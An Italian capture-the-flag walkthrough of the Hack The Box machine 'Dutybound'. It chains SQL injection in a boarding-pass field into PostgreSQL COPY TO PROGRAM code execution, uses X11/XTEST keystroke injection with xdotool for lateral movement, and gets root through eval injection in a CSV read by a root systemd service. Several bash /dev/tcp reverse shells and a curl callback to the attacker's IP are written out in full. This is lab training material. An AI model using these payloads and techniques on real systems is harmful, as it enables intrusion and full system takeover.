# Dutybound (con Burpsuite)

- - -
- tags: #htb #hackthebox #dutybound
- - - -
IP vittima: 10.129.94.25
IP attaccante: 10.10.15.73
## 1. Ricognizione iniziale

Eseguiamo una scansione di tutte le porte TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.94.25 -oN porte.txt
```

Spiegazione delle opzioni:

- `-p-`: controlla tutte le 65535 porte TCP.
- `--open`: mostra soltanto le porte aperte.
- `-sS`: esegue una scansione TCP SYN.
- `--min-rate 5000`: imposta una velocità minima di invio dei pacchetti.
- `-n`: evita la risoluzione DNS.
- `-Pn`: considera il target attivo senza effettuare prima il ping.
- `-oN porte.txt`: salva il risultato nel file `porte.txt`.

Troviamo tre porte aperte:

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

La macchina presenta quindi un servizio SSH e due servizi web. Identifichiamo servizi e versioni:

```bash
sudo nmap -sC -sV -p22,80,443 10.129.94.25 -oN servizi.txt
```

Le opzioni:

- `-sC`: esegue gli script NSE predefiniti.
- `-sV`: prova a identificare le versioni dei servizi.

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=airsnacks.htb
| Not valid before: 2026-08-26T08:17:18
|_Not valid after:  2126-08-02T08:17:18
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

|Porta|Servizio|Versione|
|---|---|---|
|22|SSH|OpenSSH 8.9p1|
|80|HTTP|nginx 1.18.0|
|443|HTTPS|nginx 1.18.0|

Nmap mostra che la porta 80 reindirizza a:

```text
https://airsnacks.htb/
```

Aggiungiamo il dominio al file `/etc/hosts` di Parrot:

```bash
sudo nano /etc/hosts
```

Inseriamo:

```text
10.129.94.25 airsnacks.htb
```
## 2. Analisi dell'applicazione web

Dal browser visitiamo:

```text
https://airsnacks.htb/
```

Troviamo **AirSnacks Self-Checkout**, un'applicazione che simula un chiosco aeroportuale.

Il funzionamento è semplice:

1. Premiamo **Touch to Start**.
2. Selezioniamo alcuni prodotti.
3. Li aggiungiamo al carrello.
4. Entriamo nel carrello
5. Procediamo alla scansione della carta d'imbarco.

La funzionalità più interessante è proprio lo scanner del boarding pass. L'applicazione sembra utilizzare le informazioni della carta d'imbarco per verificare l'idoneità agli acquisti esentasse.

Apriamo **Burp Suite → Proxy → Intercept → Open Browser** e visitiamo il sito. Vogliamo capire quali richieste HTTP vengono inviate al server.
### 2.1 Scopriamo l'endpoint del carrello

Disattiviamo _Intercept_ per navigare normalmente e apriamo **Proxy → HTTP history**.
Sul sito premiamo _Touch to Start_, scegliamo un prodotto e lo aggiungiamo al carrello.
Nella cronologia di Burp troviamo una richiesta simile a:

```http
POST /cart/add HTTP/1.1
Host: airsnacks.htb
Content-Type: application/json

{"sku":"BER-SBW-6"}
```

Abbiamo scoperto che l'applicazione utilizza:

```text
POST /cart/add
```

Il parametro `sku` contiene l'identificativo del prodotto.
L'aggiunta al carrello crea una sessione HTTP. Burp registra anche il relativo cookie, che ci servirà nelle richieste successive.
### 2.2 Scopriamo l'endpoint dello scanner

Proseguiamo nell'applicazione fino alla scansione della carta d'imbarco.
Premiamo _Scan Boarding Pass_ e controlliamo nuovamente **Proxy → HTTP history**.
Troviamo:

```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Content-Type: application/json

{"raw":""}
```

Abbiamo individuato l'endpoint che verifica i boarding pass:

```text
POST /checkout/boarding-pass/verify
```

Il parametro `raw` contiene i dati della carta d'imbarco.
Facciamo clic destro sulla richiesta e scegliamo **Send to Repeater**.
D'ora in avanti utilizzeremo Burp Repeater per modificare `raw` e osservare le risposte del server, mantenendo il cookie della sessione originale.
## 3. Identifichiamo il formato del boarding pass

In **Repeater**, lasciamo il corpo della richiesta invariato:

```json
{"raw":""}
```

Premiamo **Send**.
Il server restituisce:

```json
{
  "detail": "expected 'M' at offset 0",
  "error": "BCBP_ERR_FORMAT_CODE",
  "item": 1
}
```

Il server si aspetta il carattere `M` all'inizio del boarding pass.
Proviamo a modificare il JSON:

```json
{"raw":"M"}
```

Premiamo nuovamente **Send**.
Il server risponde con un errore differente:

```json
{
  "detail": "string too short: 1 < 60",
  "error": "BCBP_ERR_TRUNCATED",
  "item": 6
}
```

Questi errori ci permettono di identificare il formato **IATA BCBP (Bar Coded Boarding Pass)**.
Dobbiamo quindi costruire una carta d'imbarco rispettando la struttura prevista dal formato.
### 3.1 Il formato IATA BCBP

IATA BCBP è un formato standard utilizzato per codificare le informazioni presenti sulle carte d'imbarco.
Una stringa BCBP contiene diversi campi di lunghezza predefinita.

La tabella comprende tutti i campi utilizzati nel boarding pass, con il relativo numero di Item previsto dallo standard IATA.

|Item|Campo|Valore|Lunghezza|
|---|---|---|---|
|Dati obbligatori||||
|1|Format code|`M`|1|
|5|Numero tratte|`1`|1|
|11|Nome passeggero|`TEST/ALICE` + 10 spazi|20|
|253|Biglietto elettronico|`E`|1|
|7|Codice prenotazione (PNR)|`ABC123` + 1 spazio|7|
|26|Aeroporto di partenza|`FCO`|3|
|38|Aeroporto di destinazione|`LHR`|3|
|42|Compagnia aerea|`AZ` + 1 spazio|3|
|43|Numero volo|`0123` + 1 spazio|5|
|46|Giorno del volo nell'anno|`300`|3|
|71|Classe|`Y`|1|
|104|Posto assegnato|`012A`|4|
|107|Numero sequenziale check-in|`0001` + 1 spazio|5|
|113|Stato passeggero|`1`|1|
||Totale dati obbligatori||58|
|Dati aggiuntivi||||
|6|Lunghezza dati aggiuntivi|`1E` (30 in esadecimale)|2|
|8|Inizio dati condizionali|`>`|1|
|9|Versione BCBP|`6`|1|
|10|Lunghezza dati strutturati univoci|`0B` (11 in esadecimale)|2|
|15|Descrizione passeggero|`0`|1|
|12|Modalità di check-in|`W` (Web)|1|
|14|Modalità emissione boarding pass|`W` (Web)|1|
|22|Data emissione boarding pass|`6300`|4|
|16|Tipo documento|`B` (Boarding Pass)|1|
|21|Compagnia che emette il boarding pass|`AZ` + 1 spazio|3|
|17|Lunghezza dati strutturati ripetuti|`03` (3 in esadecimale)|2|
|142|Codice numerico compagnia aerea|`055`|3|
|4|For Individual Airline Use — SQL Injection|`TEST'DATA1`|10|
||Totale dati aggiuntivi (incluso Item 6)||32|
||Lunghezza totale boarding pass||90|
I campi vengono concatenati senza separatori.
Quando un campo contiene meno caratteri del previsto, viene completato con spazi.
Per esempio, il nome:

```text
TEST/ALICE
```

deve occupare 20 caratteri, quindi aggiungiamo dieci spazi. La parte obbligatoria del nostro boarding pass occupa **58 caratteri**. Subito dopo troviamo un campo di due caratteri che indica, in esadecimale, la lunghezza dei dati condizionali.

Seguono poi i dati condizionali, questi possono includere informazioni specifiche della compagnia aerea.
La struttura complessiva è:

```
[58 caratteri obbligatori]
[2 caratteri: Item 6, lunghezza dei dati aggiuntivi]
[20 caratteri: dati strutturati]
[10 caratteri: Item 4]
```

Totale: 58 + 2 + 20 + 10 = 90 caratteri.

I numeri degli Item non sono consecutivi perché identificano i campi definiti dallo standard IATA, non la loro posizione nella stringa.
## 4. Costruiamo un boarding pass valido

Un boarding pass BCBP contiene **58 caratteri obbligatori**, con le informazioni relative al passeggero e al volo.
Dopo questi caratteri possono essere presenti dati aggiuntivi.
Nel nostro caso utilizziamo questa struttura:

```text
[58 caratteri obbligatori][14][20 caratteri di dati aggiuntivi]
```

I primi 58 caratteri contengono:

```text
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 1
```

Il valore `14` indica che seguono 20 caratteri (`14` in esadecimale).
Questi 20 caratteri sono:

```text
>60B0WW6300BAZ 03055
```

Contengono la versione del formato e informazioni aggiuntive sul passeggero e sull'emissione della carta d'imbarco.
## 4.1 Inseriamo il boarding pass in Repeater

Sostituiamo il corpo della richiesta con:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 114>60B0WW6300BAZ 03055"}
```

Attenzione a conservare gli spazi presenti nel valore.
Premiamo **Send**.
Il server restituisce:

```text
HTTP/1.1 200 OK
```

La risposta contiene informazioni relative alla verifica del boarding pass, fra cui la destinazione `LHR` e un identificativo `audit_ref`.

**Abbiamo costruito un boarding pass valido, lungo 80 caratteri.**

Ora possiamo utilizzarlo come base per i test.
## 5. Scoperta della SQL Injection

### 5.1 Individuiamo il campo da modificare

Il formato BCBP permette di aggiungere informazioni specifiche della compagnia aerea, chiamate **Item 4 — For Individual Airline Use**.
Proviamo quindi ad aggiungere del testo alla fine dei 20 caratteri di dati condizionali.
Utilizziamo:

```text
TESTDATA01
```

Sono 10 caratteri.
Dobbiamo modificare anche il campo che indica la lunghezza dei dati aggiuntivi:

- Prima: `14`, cioè 20 caratteri.
- Dopo: `1E`, cioè 30 caratteri.

In Repeater sostituiamo il corpo della richiesta con:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 11E>60B0WW6300BAZ 03055TESTDATA01"}
```

Premiamo **Send**.
Il server restituisce:

```text
HTTP/1.1 200 OK
```

Questo dimostra che il parser accetta il testo aggiunto.
### 5.2 Proviamo un apostrofo

Ora sostituiamo `TESTDATA01` con:

```text
TEST'DATA1
```

Anche questa stringa contiene 10 caratteri, quindi non dobbiamo modificare la lunghezza `1E`.
Il JSON completo diventa:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 11E>60B0WW6300BAZ 03055TEST'DATA1"}
```

Premiamo **Send**.
Il server restituisce un errore PostgreSQL:

```text
syntax error at or near "DATA1"

LINE 1: ... 100, 'TEST'DATA1')
```

**Abbiamo scoperto una SQL Injection.**

Il backend utilizza il contenuto dell'Item 4 all'interno di una query SQL senza gestire correttamente gli apostrofi.
L'apostrofo contenuto in `TEST'DATA1` chiude anticipatamente una stringa SQL e provoca l'errore.
Da questo momento possiamo utilizzare lo stesso campo per inviare espressioni PostgreSQL.
## 6. Identificazione dell'utente PostgreSQL e Verifica dei privilegi PostgreSQL

Vogliamo scoprire quale utente del database viene utilizzato dall'applicazione.
PostgreSQL dispone della variabile:

```sql
CURRENT_USER
```

che restituisce il nome dell'utente corrente.
Possiamo forzarne la conversione a numero intero:

```sql
CURRENT_USER::INT
```

Poiché il nome dell'utente non è numerico, PostgreSQL genera un errore contenente il valore di **CURRENT_USER**.
### 6.1 Identificazione dell'utente PostgreSQL

Sostituiamo il precedente `TEST'DATA1` con:

```sql
X'||CURRENT_USER::INT||'Y
```

Il payload contiene 25 caratteri.
I dati condizionali diventano quindi lunghi:

```text
20 + 25 = 45 caratteri
```

45 in esadecimale è `2D`.
Dobbiamo quindi sostituire `1E` con `2D`.
Il nuovo corpo JSON è:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 12D>60B0WW6300BAZ 03055X'||CURRENT_USER::INT||'Y"}
```

Premiamo **Send**.
Il server risponde:

```text
invalid input syntax for type integer: "airsnacks_app"
```

Abbiamo scoperto che l'applicazione utilizza l'utente PostgreSQL:

```text
airsnacks_app
```
### 6.2 Verifica dei privilegi PostgreSQL

Ora vogliamo capire se `airsnacks_app` possiede il privilegio:

```text
pg_execute_server_program
```

Questo privilegio permette di eseguire programmi sul sistema operativo attraverso PostgreSQL.
Per verificarlo utilizziamo:

```sql
pg_has_role(current_user,'pg_execute_server_program','USAGE')
```

La funzione restituisce `true` quando il privilegio è disponibile.

Utilizziamo:

```sql
X'||(pg_has_role(current_user,'pg_execute_server_program','USAGE'))::text::int||'Y
```

La conversione finale a intero serve ancora una volta a provocare un errore che mostri il risultato.
Il payload è lungo 82 caratteri.
La nuova lunghezza dei dati condizionali è:

```text
20 + 82 = 102 caratteri
```

102 in esadecimale è `66`.

Sostituiamo quindi il corpo della richiesta con:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 166>60B0WW6300BAZ 03055X'||(pg_has_role(current_user,'pg_execute_server_program','USAGE'))::text::int||'Y"}
```

Premiamo **Send**.
Il server restituisce:

```text
invalid input syntax for type integer: "true"
```

**L'utente** `**airsnacks_app**` **possiede il privilegio** `**pg_execute_server_program**`**.**
Possiamo quindi tentare di eseguire comandi Linux attraverso PostgreSQL.
## 7. Remote Code Execution tramite PostgreSQL e Initial Foothold

PostgreSQL permette agli utenti autorizzati di eseguire programmi sul server utilizzando:

```sql
COPY (SELECT 1) TO PROGRAM 'comando';
```

Per sfruttare questa funzione dobbiamo terminare la query SQL originale e aggiungere una nuova istruzione.

Utilizziamo questa struttura:

```sql
X'); COPY (SELECT 1) TO PROGRAM 'comando';--
```

Dove:

- `X');` chiude la stringa e termina la query originale.
- `COPY TO PROGRAM` esegue il comando sul sistema operativo.
- `--` commenta il resto della query.
### 7.1 Verifichiamo l'esecuzione di comandi

Su Parrot apriamo un terminale e avviamo un server HTTP:

```bash
python3 -m http.server 8000
```

Vogliamo che PostgreSQL esegua questo comando:

```bash
curl -m 5 -s http://10.10.15.73:8000/pg-rce
```

Se funziona, riceveremo una richiesta HTTP dal target.
Prepariamo il payload SQL:

```sql
X'); COPY (SELECT 1) TO PROGRAM 'curl -m 5 -s http://10.10.15.73:8000/pg-rce';--
```

Il payload contiene 80 caratteri.
La lunghezza dei dati condizionali diventa:

```text
20 + 80 = 100 caratteri
```

100 in esadecimale è `64`.
In Burp Repeater inseriamo:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 164>60B0WW6300BAZ 03055X'); COPY (SELECT 1) TO PROGRAM 'curl -m 5 -s http://10.10.15.73:8000/pg-rce';--"}
```

Premiamo **Send**.
Sul server HTTP di Parrot compare una richiesta:

```text
10.129.231.23 "GET /pg-rce HTTP/1.1" 404 -
```

La richiesta proviene dalla macchina target.
Il codice `404` non è importante: dimostra che PostgreSQL ha eseguito il comando `curl`.
**Abbiamo confermato la Remote Code Execution.**
### 7.2 Initial Foothold: reverse shell come postgres

Ora che possiamo eseguire comandi Linux, vogliamo ottenere una shell sul server.
Avviamo il listener su Parrot:

```bash
nc -lvnp 4444
```

Netcat rimane in ascolto sulla porta 4444.

Prepariamo la reverse shell. Il comando Bash che vogliamo eseguire è:

```bash
bash -i >& /dev/tcp/10.10.15.73/4444 0>&1
```

Questo comando apre una shell interattiva e ne reindirizza input e output verso il nostro Parrot.
Per eseguirlo attraverso PostgreSQL, utilizziamo il payload:

```sql
X'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--
```

Gli apostrofi doppi `''` servono a rappresentare correttamente gli apostrofi interni alla stringa SQL.
Il payload contiene 90 caratteri.
La lunghezza complessiva dei dati condizionali è:

```text
20 + 90 = 110 caratteri
```

110 in esadecimale è `6E`.

Lanciamo l'exploit da Burp Repeater. Sostituiamo il corpo della richiesta con:

```json
{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 16E>60B0WW6300BAZ 03055X'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--"}
```

Premiamo **Send**.

La richiesta potrebbe rimanere in attesa oppure terminare per timeout, perché il comando Linux mantiene aperta la connessione della reverse shell.
Sul listener Netcat di Parrot riceviamo una connessione.

Verifichiamo:

```bash
whoami
id
hostname
```

Risultato:

```text
postgres

uid=114(postgres) gid=121(postgres)
groups=121(postgres),120(ssl-cert)

dutyfree-kiosk7
```

**Abbiamo ottenuto una shell sulla macchina come utente** `**postgres**`**.**
### 7.3 Stabilizziamo la shell

La shell ricevuta tramite Netcat non è un terminale completamente interattivo.
Possiamo migliorarla con Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Premiamo `Ctrl+Z` per sospendere temporaneamente Netcat.
Sul terminale Parrot eseguiamo:

```bash
stty raw -echo; fg
```

Premiamo Invio, quindi:

```bash
export TERM=xterm
```

Ora abbiamo una shell più comoda da utilizzare.
## 8. Movimento laterale: da postgres a dutyfree-kiosk

Abbiamo ottenuto una shell come `postgres`. Ora cerchiamo un modo per aumentare i privilegi.
### 8.1 Individuiamo gli utenti e i processi

Eseguiamo:

```bash
grep '/bin/bash' /etc/passwd
```

Troviamo tre utenti:

```text
root:x:0:0:root:/root:/bin/bash
dutyfree-kiosk:x:1000:1000::/home/dutyfree-kiosk:/bin/bash
postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

L'utente `dutyfree-kiosk` è interessante perché sembra essere l'account utilizzato per eseguire il chiosco aeroportuale.

Controlliamo le directory personali:

```bash
ls -la /home
```

Troviamo la directory:

```text
/home/dutyfree-kiosk
```

Ma l'utente `postgres` non possiede i permessi necessari per accedervi. Il nostro prossimo obiettivo è diventare `dutyfree-kiosk`, un altro utente presente sulla macchina.
### 8.2 Scopriamo che dutyfree-kiosk utilizza una sessione grafica

Controlliamo i processi in esecuzione:

```bash
ps auxww
```

Tra i risultati troviamo:

```text
dutyfre+    1767  0.0  0.5 228600 20244 tty7     S    20:49   0:00 /usr/bin/openbox --startup /usr/lib/x86_64-linux-gnu/openbox-autostart OPENBOX

e

dutyfre+    1770  1.2  9.8 3304408 394284 tty7   Sl   20:49   0:36 /snap/firefox/8803/usr/lib/firefox/firefox --kiosk https://airsnacks.htb
```

Questo ci dice che l'utente `dutyfree-kiosk` sta utilizzando una sessione grafica con **Openbox**, un gestore di finestre per X11. Vogliamo verificare se possiamo interagire con questa sessione grafica dalla nostra shell `postgres`.
### 8.3 Verifichiamo l'accesso a X11

Eseguiamo:

```bash
DISPLAY=:0 xset q
```

Il comando restituisce le impostazioni del display.

Questo significa che `postgres` riesce a collegarsi al server grafico X11.

Controlliamo se è disponibile l'estensione XTEST:

```bash
DISPLAY=:0 xdpyinfo -queryExtensions | grep XTEST
```

Risultato:

```text
XTEST (opcode: 133)
```

**XTEST permette di simulare la pressione dei tasti sulla tastiera.**

Possiamo quindi provare a utilizzare la sessione grafica di `dutyfree-kiosk` per eseguire un comando.
### 8.4 Scopriamo come aprire un terminale

Openbox permette di associare combinazioni di tasti a determinati programmi.

Cerchiamo nel suo file di configurazione **rc.xml** una scorciatoia per aprire un terminale:

> Il file `/etc/xdg/openbox/rc.xml` è il file di configurazione predefinito di sistema per il window manager Openbox
> Definisce il comportamento globale della sessione Openbox, incluse le scorciatoie da tastiera (`<keyboard>`), le impostazioni del mouse, i desktop virtuali, il tema visivo, la gestione delle finestre e le regole per singole applicazioni (`<applications>`).

```bash
grep -A 3 'keybind' /etc/xdg/openbox/rc.xml
```

Troviamo:

```xml
<keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

Abbiamo scoperto che premendo **Ctrl+Alt+T** viene aperto un terminale `xterm`.

Se simuliamo questa combinazione con XTEST, Openbox aprirà un terminale come `dutyfree-kiosk`. Possiamo sfruttare questa funzionalità utilizzando **xdotool**, un programma che permette di simulare la pressione dei tasti tramite XTEST.

Il programma non è installato sulla macchina e non abbiamo i privilegi root per installarlo. Possiamo però scaricarlo su Parrot, trasferirlo al target e utilizzarlo senza installazione.

Potremo poi scrivere un comando al suo interno.
### 8.5 Prepariamo la reverse shell

Dalla shell `postgres` creiamo un file Bash:

```bash
cat > /tmp/duty.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.15.73/5555 0>&1'
EOF
```

Impostiamo i permessi:

```bash
chmod 755 /tmp/duty.sh
```

Lo script aprirà una reverse shell verso il nostro Parrot sulla porta `5555`.

Su **Parrot** avviamo Netcat:

```bash
nc -lvnp 5555
```
### 8.6 Scarichiamo xdotool su Parrot

Apriamo un terminale su Parrot e creiamo una directory:

```bash
mkdir -p /tmp/xdotool-htb
cd /tmp/xdotool-htb
```

Scarichiamo i due pacchetti necessari per Ubuntu 22.04:

```bash
curl -fLO https://archive.ubuntu.com/ubuntu/pool/universe/x/xdotool/xdotool_3.20160805.1-4_amd64.deb
curl -fLO https://archive.ubuntu.com/ubuntu/pool/universe/x/xdotool/libxdo3_3.20160805.1-4_amd64.deb
```

Il primo contiene il programma `xdotool`, mentre il secondo contiene la libreria `libxdo3` necessaria al suo funzionamento.

Avviamo un server HTTP per trasferire i file:

```bash
python3 -m http.server 8001
```
### 8.7 Trasferiamo ed estraiamo xdotool sul target

Dalla shell `postgres` creiamo una directory temporanea:

```bash
mkdir -p /tmp/xdotool-local
cd /tmp/xdotool-local
```

Scarichiamo i due pacchetti dal server HTTP di Parrot:

```bash
curl -fO http://10.10.15.73:8001/xdotool_3.20160805.1-4_amd64.deb
curl -fO http://10.10.15.73:8001/libxdo3_3.20160805.1-4_amd64.deb
```

Estraiamo i file:

```bash
for file in *.deb; do
    dpkg-deb -x "$file" .
done
```

`dpkg-deb -x` estrae il contenuto dei pacchetti nella directory corrente, **senza installarli e senza richiedere privilegi root**.

Rendiamo disponibile il programma:

```bash
export PATH="/tmp/xdotool-local/usr/bin:$PATH"
export LD_LIBRARY_PATH="/tmp/xdotool-local/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH:-}"
export DISPLAY=:0
```

Adesso possiamo utilizzare `xdotool` dalla shell `postgres`.
### 8.8 Apriamo un terminale come dutyfree-kiosk

Eseguiamo:

```bash
xdotool key ctrl+alt+t
```

Questo comando simula `Ctrl+Alt+T`.

Openbox intercetta la combinazione e apre un terminale `xterm` con i privilegi di `dutyfree-kiosk`.
### 8.9 Selezioniamo il terminale ed eseguiamo la reverse shell

Attendiamo che la finestra venga aperta:

```bash
sleep 2
```

Selezioniamo il terminale e gli assegniamo il focus della tastiera:

```bash
xdotool search --sync --onlyvisible --class xterm windowactivate --sync windowfocus --sync
```

Questo comando cerca una finestra `xterm` visibile, la attiva e le assegna il focus. Se sono aperti più terminali `xterm`, è preferibile selezionare esplicitamente quello appena creato.

Ora facciamo digitare il comando che avvia la reverse shell:

```bash
xdotool type --clearmodifiers --delay 80 'bash /tmp/duty.sh'
xdotool key Return
```

Il primo comando scrive nel terminale:

```bash
bash /tmp/duty.sh
```

Il secondo simula la pressione di Invio.

Lo script `/tmp/duty.sh`, già preparato nel punto precedente, apre una reverse shell verso Parrot sulla porta `5555`.
### 8.10 Otteniamo la shell come dutyfree-kiosk

Sul listener Netcat di Parrot riceviamo la connessione.

Verifichiamo:

```bash
whoami
id
```

Risultato:

```text
dutyfree-kiosk
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
```

**Abbiamo ottenuto una shell come** `dutyfree-kiosk` **sfruttando X11 e XTEST, senza utilizzare script Python.
Nella cartella** `/home/dutyfree-kiosk` **troviamo la user flag**
## 9. Privilege Escalation: da dutyfree-kiosk a root

Ora che siamo `dutyfree-kiosk`, cerchiamo un modo per ottenere i privilegi di `root`.
### 9.1 Individuiamo un servizio systemd

Esaminiamo i servizi personalizzati presenti sulla macchina:

```
ls /etc/systemd/system/
```

Tra i risultati troviamo:

```
vrs-duty-apply.path
vrs-duty-apply.service
```

Sono servizi personalizzati, quindi vale la pena esaminarli.

Leggiamo il primo file:

```
cat /etc/systemd/system/vrs-duty-apply.path
```

La parte importante è:

```
[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service
```

Questo significa che **quando viene modificato il file** `**duty-rates.csv**`**, systemd avvia automaticamente** `**vrs-duty-apply.service**`.

Vediamo che cosa esegue questo servizio:

```
cat /etc/systemd/system/vrs-duty-apply.service
```

Troviamo:

```
[Service]
Type=oneshot
EnvironmentFile=/etc/airsnacksdf/db.env
ExecStart=/opt/vrs/bin/apply-duty-rates.sh
```

Il servizio esegue quindi:

```
/opt/vrs/bin/apply-duty-rates.sh
```

Non essendo specificato un utente con `User=`, il servizio viene eseguito come **root**.

Analizziamo lo script.
### 9.2 Scopriamo la vulnerabilità Bash

Eseguiamo:

```
cat /opt/vrs/bin/apply-duty-rates.sh
```

Le parti interessanti sono:

```
RATES="/opt/vrs/data/duty-rates.csv"
```

e

```
while IFS=, read -r tax_class duty_pct vat_pct; do
    (( ++lineno ))

    if [[ -z "$tax_class" || -z "$duty_pct" || -z "$vat_pct" ]]; then
        echo "apply-duty-rates: line $lineno: missing field" >&2
        exit 1
    fi

    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
        echo "apply-duty-rates: line $lineno: rate must be numeric" >&2
        exit 1
    fi

    eval "${tax_class}=${duty_pct}"

done < "$RATES"
```

Lo script legge il file CSV **duty-rates.csv** contenente le aliquote fiscali.

Vediamo com'è fatto:

```
cat /opt/vrs/data/duty-rates.csv
```

Risultato:

```
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
```

Ogni riga contiene tre valori separati da virgole.

Per esempio:

```
SPIRITS,45,20
```

Viene interpretata così:

```
tax_class = SPIRITS
duty_pct  = 45
vat_pct   = 20
```

Poi lo script esegue:

```
eval "${tax_class}=${duty_pct}"
```

Che diventa:

```
eval "SPIRITS=45"
```

**La vulnerabilità è l'utilizzo di** `**eval**`**.**

`eval` interpreta il testo ricevuto come un comando Bash.

Lo script controlla che i due valori numerici siano corretti, ma non controlla che `tax_class` contenga soltanto il nome di una categoria.

Se possiamo modificare il CSV, possiamo inserire comandi Bash all'interno di `tax_class`.

Poiché lo script viene eseguito come root, anche questi comandi verranno eseguiti come root.
### 9.3 Verifichiamo i permessi del CSV

Eseguiamo:

```
ls -l /opt/vrs/data/duty-rates.csv
```

Risultato:

```
-rw-rw-r-- root pos-ops duty-rates.csv
```

Il file può essere modificato dal proprietario `root` e dagli utenti appartenenti al gruppo `pos-ops`.

Ricordiamo che siamo diventati `dutyfree-kiosk` e che il comando `id` ci aveva mostrato:

```
groups=1000(dutyfree-kiosk),1001(pos-ops)
```

**Possiamo quindi modificare il CSV.**

Abbiamo tutti gli elementi necessari per ottenere una shell root.
## 10. Sfruttiamo la Command Injection

### 10.1 Prepariamo Netcat

Su Parrot apriamo un nuovo terminale:

```
nc -lvnp 6666
```

Vogliamo fare eseguire allo script systemd una reverse shell verso questa porta.

Il comando che utilizzeremo è:

```
bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1'
```
### 10.2 Modifichiamo il CSV

Sostituiamo la prima riga del file con un payload Bash:

```
cat > /opt/vrs/data/duty-rates.csv <<'EOF'
SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
EOF
```

La riga originale era:

```
SPIRITS,45,20
```

Quella modificata è:

```
SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#,45,20
```

Vediamo perché funziona.

Lo script divide la nuova riga in tre parti:

```
tax_class = SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#
duty_pct  = 45
vat_pct   = 20
```

Gli ultimi due valori sono ancora numerici, quindi superano il controllo.

Quando lo script esegue:

```
eval "${tax_class}=${duty_pct}"
```

Bash interpreta:

```
SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#=45
```

Il comando viene interpretato così:

- `SPIRITS=45`: assegna il valore alla variabile.
- `;`: termina il primo comando.
- `bash -c '...'`: esegue la nostra reverse shell.
- `#`: commenta il resto della riga, impedendo che `=45` interferisca con il comando.

**Abbiamo inserito una Command Injection che verrà eseguita come root.**
### 10.3 Attiviamo il servizio systemd

Ricordiamo che `vrs-duty-apply.path` monitora le modifiche del CSV:

```
PathModified=/opt/vrs/data/duty-rates.csv
```

Quando abbiamo modificato il file, systemd ha rilevato il cambiamento e avviato:

```
vrs-duty-apply.service
```

Il servizio ha eseguito:

```
/opt/vrs/bin/apply-duty-rates.sh
```

Lo script ha letto il nostro payload e lo ha interpretato attraverso `eval`  inviando la reverse shell sulla nostra porta `6666`.
## 11. Accesso root

Sul listener Netcat di Parrot eseguiamo:

```
whoami
id
```

Risultato:

```
root
uid=0(root) gid=0(root) groups=0(root)
```

**Abbiamo ottenuto una shell root.**

Nella cartella **/root** troviamo la root flag.

La macchina è completata.
